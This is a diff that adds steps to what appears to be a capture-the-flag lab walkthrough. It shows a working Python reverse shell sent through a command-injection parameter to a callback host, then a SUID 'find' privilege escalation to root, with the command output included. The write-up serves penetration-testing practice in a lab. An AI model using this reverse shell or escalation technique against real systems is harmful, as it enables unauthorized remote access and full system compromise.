@@ -54,12 +54,50 @@ http://192.168.56.123/workinginprogress.php?cmd=id
 
 ### 3.Gaining Shell
 
+Use a python reverse shell, url encode it and send to get the shell
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+### 4.Privilege Escalation
+
+Search for SUID binaries
+
+```bash
+$ find / -user root -perm /4000 2>/dev/null
+find / -user root -perm /4000 2>/dev/null
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/grep
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/find
+/usr/bin/newgrp
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+```
+
+here it shows that `find` has SUID bit set, use `GTFobins` to find how to escalate it :
 
 
+```bash
+$ find . -exec /bin/sh -p \; -quit
 
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
 
+cd /root
 
+cat root.txt
+Y29uZ3JhdHVsYXRpb25zCg==
+```
 
+This is how you can get root on this machine :)
 
 
 
